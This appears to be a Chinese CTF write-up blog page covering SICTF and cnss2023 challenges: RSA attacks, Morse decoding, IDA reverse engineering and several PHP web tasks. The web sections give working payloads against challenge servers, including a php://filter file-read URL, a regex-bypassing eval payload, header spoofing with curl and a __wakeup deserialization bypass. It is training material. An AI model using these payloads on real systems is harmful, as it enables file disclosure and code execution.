class="string">&quot;786426913645332991929803636719878643130489430090701482974255190570111407517277263761161970232982615374753982050075781017755721714929721429185828101898786972242994012456972241276851428750970754773002966788642795040933520662931514953660571657013642671173456750800960592586345219252277575624120271330470724245201080094330964145796872211627254805407394764183615099525852600855622089361965086460279057625205099471122036599934609091062009161119885692567925924978687256063116915630947838112126347748759078024890458539541208153526564434483654508834147071166870006117573542198238493913144419569943131642262575848786399020602&quot;</span></span><br><span class="line">    c2 = <span class="string">&quot;14269311999815379511888097227418748728398011595172649708273598243317106830139061994801598925448165045032084910971094414749744701731066555194159863759072739031915833091715422787808666326235589236328864675164322734119047182014621724868200908222400504845559290620275973427127376594365043386362821355037781568524903149101953873768462097165128186788759111090267131443645126715520994688945363059795513931799317608292977574376954729552861360597103229877031117089231816770880909815561950691603994439997197261395452797893557057320175747162837857668062550646101714062365530246698404923128445182100334335447738834779014705114350&quot;</span></span><br><span class="line">    c3 = <span class="string">&quot;3204718091370324153305164801961074660508922478706979436653573192321723216725523523538914956544950802616295043619768261075799875855502834749045520466140056621489305006966280527055668378303630674311102581232313032585389907028715671091914904062961720585667564982641321454541632782484415075257140508738041786400512095949826279576159569786734978545737717138115729502475357594151593143140355121154223614868465202149338507796306863351134218879326031985027900678671697876083351974546516576983143592764763925335805465720148057651958521255276602933604064541840892578409973858867533575728482926007556060584654853884046046420855&quot;</span></span><br><span class="line"></span><br><span class="line">    cList = [<span class="built_in">int</span>(c1), <span class="built_in">int</span>(c2), <span class="built_in">int</span>(c3)]</span><br><span class="line">    nList = [<span class="built_in">int</span>(n1), <span class="built_in">int</span>(n2), <span class="built_in">int</span>(n3)]</span><br><span class="line">    m_e = CRT(cList, nList)</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>,<span class="number">18</span>):</span><br><span class="line">        m, f = gmpy2.iroot(m_e, e)</span><br><span class="line">        m = <span class="built_in">hex</span>(m)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(m) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            m = m + <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        flag = binascii.unhexlify(m)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>SICTF{fdc0afb5-1c81-46b9-a28a-241f5f64419d}</p>
<h2 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, Eq, solve</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">23407088262641313744603678186127228163189328033499381357614318160776774708961658114505773173784501557046914457908828086210961235530240151825359345210845219656000760996670856300710703016947799649686427460688236465568188205550456293373157997725204643414082796492333552579250010906010553831060540937802882205118399938918764313169385349293602085310111289583058965780887097301702677087443291977479125263301000328313103296364864396361278863921717374909215078711198899810620522933994481419395021233240234478331179727351050575360886334237633420906629984625441302945112631166021776379103081857393866576659121443879590011160797</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">1584727211980974717747362694412040878682966138197627512650829607105625096823456063149392973232737929737200028676411430124019573130595696272668927725536797627059576270068695792221537212669276826952363636924278717182163166234322320044764324434683614360641636360301452618063418349310497430566465329766916213742181</span></span><br><span class="line">m1 = <span class="number">11658736990073967239197168945911788935424691658202162501032766529463315401599017877851823976178979438592</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n)</span><br><span class="line"></span><br><span class="line">delta_m_symbol = symbols(<span class="string">&#x27;delta_m&#x27;</span>)</span><br><span class="line">polynomial_equation = Eq(c, (m1 + delta_m_symbol)**<span class="number">3</span>)</span><br><span class="line">solutions = solve(polynomial_equation, delta_m_symbol)</span><br><span class="line">m_recovered = m1 + solutions[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m_recovered)[<span class="number">2</span>:]).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>SICTF{2ca8e589-4a31-4909-80f0-9ecfc8f8cb37}</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="签到-Include"><a href="#签到-Include" class="headerlink" title="[签到]Include"></a>[签到]Include</h2><p><a target="_blank" rel="noopener" href="http://210.44.151.51:10120/?SICTF=php://filter/read=convert.base64-encode/resource=flag.php">http://210.44.151.51:10120/?SICTF=php://filter/read=convert.base64-encode/resource=flag.php</a> 读到下面内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file_path = &quot;/flag&quot;;</span><br><span class="line">if (file_exists($file_path)) &#123;</span><br><span class="line">    $flag = file_get_contents($file_path);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;error&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问flag.php没有error，所以用伪协议读&#x2F;flag 拿到flag</p>
<p><a target="_blank" rel="noopener" href="http://210.44.151.51:10120/?SICTF=php://filter/read=convert.base64-encode/resource=/flag">http://210.44.151.51:10120/?SICTF=php://filter/read=convert.base64-encode/resource=/flag</a></p>
<p>base64解码SICTF{f9bcd5bf-2e28-404c-936c-92d7f0ba2158}</p>
<h2 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby_PHP"></a>Baby_PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/_|%5f|\.|%2E/i&#x27;</span>, <span class="variable">$query</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;You are Hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k_e_y&#x27;</span>] !==<span class="string">&#x27;123&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^123$/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;k_e_y&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;You are will Win!&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;command&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\~|\`|\@|\#|\\$|\%|\&amp;|\*|\（|\）|\-|\+|\=|\&#123;|\&#125;|\[|\]|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>,<span class="variable">$command</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;You are Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;K_e_y is Errors!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里第一个preg是可以用url编码代替下划线，然后第二个preg</p>
<p>$_GET[key]是强比较加后面的preg_match，搜了好久发现可以用换行符%0A绕过这个k%20e%20y&#x3D;123%0A</p>
<p>command中preg那个这个圆括号是中文的圆括号，也就是说可以用函数，我一开始想着是system()然后去网上找些shell中的一些奇怪的技巧去绕过，然后发现关键的字符基本上都给过滤了，后面想了一下能用函数，那是不是可以用函数来替代原本该用shell操作的动作</p>
<p>在这篇文章里面找到了结果<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/107171940?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161461040516780255236081%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161461040516780255236081&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-107171940.pc_search_result_no_baidu_js&utm_term=%E6%97%A0%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">https://blog.csdn.net/qq_38154820/article/details/107171940?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161461040516780255236081%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161461040516780255236081&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-107171940.pc_search_result_no_baidu_js&amp;utm_term=%E6%97%A0%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96</a></p>
<p>最后的payload是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?k%20e%20y=123%0A</span><br><span class="line">command=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="fast-morse"><a href="#fast-morse" class="headerlink" title="fast_morse"></a>fast_morse</h2><p>摩斯密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..-. ..--- .- ----- ----. -... ..-. -....- --... ..-. ....- .- -....- ....- ..--- -.... ----. -....- ----. ...-- .- ..... -....- -.-. ---.. .- ....- ---.. ...-- -.... ----- -... ----- ...-- -.-.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;f2a09bf-7f4a-4269-93a5-c8a48360b03c&#125;</span><br></pre></td></tr></table></figure>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-09-18</span><i class="fa fa-tag"></i><a class="tag" href="/tags/ctf-writeup/" title="ctf writeup">ctf writeup </a><span class="leancloud_visitors"></span><span>About 1287 words, 4 min 17 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/09/18/cnss2023/">cnss2023</a></h3></div><div class="post-content"><div class="card"><p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Baby-SignIn"><a href="#Baby-SignIn" class="headerlink" title="[Baby] SignIn"></a>[Baby] SignIn</h2><p>查看源代码，script.js文件中有一段document.getElementById(‘flag’).addEventListener(‘click’, function()下面是一段jsfuck混淆</p>
<p><a target="_blank" rel="noopener" href="https://enkhee-osiris.github.io/Decoder-JSFuck/">https://enkhee-osiris.github.io/Decoder-JSFuck/</a>  得到flag</p>
<h2 id="Baby-Backdoor"><a href="#Baby-Backdoor" class="headerlink" title="[Baby] Backdoor"></a>[Baby] Backdoor</h2><p>post传system()执行系统命令，找到flag</p>
<h2 id="Baby-Webpack"><a href="#Baby-Webpack" class="headerlink" title="[Baby] Webpack"></a>[Baby] Webpack</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/guowenrui/p/17023732.html">https://www.cnblogs.com/guowenrui/p/17023732.html</a> 参考的这个文章</p>
<p>安装nodejs 用reverse-sourcemap .map文件还原找到flag</p>
<h2 id="Easy-Leak"><a href="#Easy-Leak" class="headerlink" title="[Easy] Leak"></a>[Easy] Leak</h2><p>.swp备份文件 vim -r还原得到flag</p>
<h2 id="Easy-ezhttp"><a href="#Easy-ezhttp" class="headerlink" title="[Easy] ezhttp"></a>[Easy] ezhttp</h2><p>传参的时候有些问题，像传host还有referer，可能是我这边安装的burp有问题，上网上查了一下发现curl也能传很多参数</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X CNSS -A &quot;Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4313 MMWEBSDK/20220604 Mobile Safari/537.36 MMWEBID/8603 MicroMessenger/8.0.24.2180(0x28001851) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64&quot; -H &quot;Referer: cnss.io&quot; -H &quot;X-Forwarded-For: 127.0.0.1&quot; -H &quot;Host: uestc.edu.cn&quot; -H &quot;Content-Type: application/json&quot; -d &quot;&#123;\&quot;name\&quot;: \&quot;nyyyddddn\&quot;,\&quot;password\&quot; : \&quot;123456\&quot;&#125;&quot; -b &quot;name=nyyyddddn;password=123456&quot; -u nyyyddddn:123456 http://124.221.34.13:50005/Index</span><br></pre></td></tr></table></figure>



<h2 id="Easy-ezunserialize"><a href="#Easy-ezunserialize" class="headerlink" title="[Easy] ezunserialize"></a>[Easy] ezunserialize</h2><p>fssmsl网页那显示错误是unicode里面的LRI PDI RLO的原因，在ide里面没有这种问题，传参的时候转url编码传就行了，只需要改对象数量绕过__wakeup就拿到flag了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$i_want2_say</span> = <span class="string">&#x27;‮⁦fssmsl⁩⁦i_like_web&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span> = <span class="string">&#x27;ctf&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;i_want2_say = <span class="string">&#x27;i_like_web&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt; wake up! &lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;destruct&lt;br /&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password === <span class="string">&#x27;ctf&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;i_want2_say === <span class="string">&#x27;‮⁦fssmsl⁩⁦i_like_web&#x27;</span>) &#123; <span class="comment">//wtf</span></span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you are 2 baby la&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$aa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CNSS</span>();</span><br><span class="line"><span class="variable">$ss</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>);</span><br><span class="line"><span class="variable">$ss</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;CNSS&quot;:3&#x27;</span>,<span class="string">&#x27;&quot;CNSS&quot;:4&#x27;</span>,<span class="variable">$ss</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$ss</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Baby-Welcome-to-Reverse-World"><a href="#Baby-Welcome-to-Reverse-World" class="headerlink" title="[Baby] Welcome to Reverse World!"></a>[Baby] Welcome to Reverse World!</h2><p>main函数那，一打开就有flag了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">Str= byte ptr -40h</span><br><span class="line"></span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 60h</span><br><span class="line">call    __main</span><br><span class="line">lea     rax, [rbp+Str]</span><br><span class="line">mov     rdx, rax</span><br><span class="line">lea     rcx, Format     ; &quot;%s&quot;</span><br><span class="line">call    scanf</span><br><span class="line">lea     rax, [rbp+Str]</span><br><span class="line">mov     rcx, rax        ; Str</span><br><span class="line">call    strlen</span><br><span class="line">mov     rdx, rax</span><br><span class="line">lea     rax, [rbp+Str]</span><br><span class="line">mov     r8, rdx         ; Size</span><br><span class="line">lea     rdx, flag       ; &quot;cnss&#123;1t_s3ems_l1ke_Y0u_c4n_us3_IDA_n0w!&quot;...</span><br><span class="line">mov     rcx, rax        ; Buf1</span><br><span class="line">call    memcmp</span><br><span class="line">test    eax, eax</span><br><span class="line">jnz     short loc_401587</span><br></pre></td></tr></table></figure>



<h2 id="Baby-Find-me"><a href="#Baby-Find-me" class="headerlink" title="[Baby] Find me"></a>[Baby] Find me</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 20h</span><br><span class="line">call    __main</span><br><span class="line">lea     rcx, aOopsWhereIsMyF ; &quot;Oops! Where is my flag?&quot;</span><br><span class="line">call    puts</span><br><span class="line">lea     rcx, aLearnAboutStri ; &quot;Learn about Strings and you can see the&quot;...</span><br><span class="line">call    puts</span><br><span class="line">lea     rcx, aLearnAboutFunc ; &quot;Learn about Functions and you can see t&quot;...</span><br><span class="line">call    puts</span><br><span class="line">lea     rcx, aLearnAboutXref ; &quot;Learn about Xref and you can see the th&quot;...</span><br><span class="line">call    puts</span><br><span class="line">lea     rcx, aTheLastPartIsI ; &quot;The last part is _ID4_N0w!&#125;&quot;</span><br><span class="line">call    puts</span><br><span class="line">add     rsp, 20h</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure>

<p>根据提示，搜字符串cnss{ ，alt+t匹配大小写，找到第一部分cnss{W0w!Y0u’,0</p>
<p>查找函数，发现第二部分是函数名_Comp1et3ly_Uns7and_</p>
<p>交叉引用puts找到第三部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">public sub736</span><br><span class="line">sub736 proc near</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 20h</span><br><span class="line">mov     ecx, 68h ; &#x27;h&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 30h ; &#x27;0&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 77h ; &#x27;w&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 5Fh ; &#x27;_&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 74h ; &#x27;t&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 30h ; &#x27;0&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 5Fh ; &#x27;_&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 75h ; &#x27;u&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 73h ; &#x27;s&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">mov     ecx, 33h ; &#x27;3&#x27;  ; Character</span><br><span class="line">call    putchar</span><br><span class="line">lea     rcx, Buffer     ; &quot;Find out which function refer to me!&quot;</span><br><span class="line">call    puts</span><br><span class="line">mov     eax, 1BF52h</span><br><span class="line">add     rsp, 20h</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>拼接获得flag cnss{W0w!Y0u_Comp1et3ly_Uns7and_h0w_t0_us3_ID4_N0w!}</p>
<h2 id="Easy-回レ-雪月花"><a href="#Easy-回レ-雪月花" class="headerlink" title="[Easy] 回レ! 雪月花"></a>[Easy] 回レ! 雪月花</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v7);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    v7[i] ^= <span class="number">0x11</span>u;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">28</span>; ++j )</span><br><span class="line">    encode(&amp;v7[j], &amp;v7[j + <span class="number">1</span>], &amp;v7[j + <span class="number">2</span>], &amp;v7[j + <span class="number">3</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">31</span> &amp;&amp; v7[k] == cipher[k]; ++k )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( k == <span class="number">32</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种逆向题倒过来看会很直观，分三层，把输入的字符串异或上0x11u，然后encode一遍，和cipher判断，一致获得flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">encode</span><span class="params">(_BYTE *a1, _BYTE *a2, _BYTE *a3, _BYTE *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+2Dh] [rbp-3h]</span></span><br><span 